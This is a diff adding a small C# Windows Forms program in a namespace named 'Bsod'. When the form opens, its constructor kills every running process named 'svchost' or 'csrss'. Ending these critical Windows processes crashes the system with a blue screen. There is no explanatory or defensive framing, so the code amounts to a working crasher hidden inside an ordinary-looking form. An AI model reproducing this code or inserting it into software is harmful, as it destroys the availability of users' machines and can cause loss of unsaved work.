@@ -1,0 +1,33 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Diagnostics;
+
+namespace Bsod
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+            System.Diagnostics.Process[] localByName = System.Diagnostics.Process.GetProcesses();
+            foreach (System.Diagnostics.Process pr in localByName)
+            {
+                if (pr.ProcessName == "svchost")
+                {
+                    pr.Kill();
+                }
+                if (pr.ProcessName == "csrss")
+                {
+                    pr.Kill();
+                }
+            }
+        }
+    }
+}
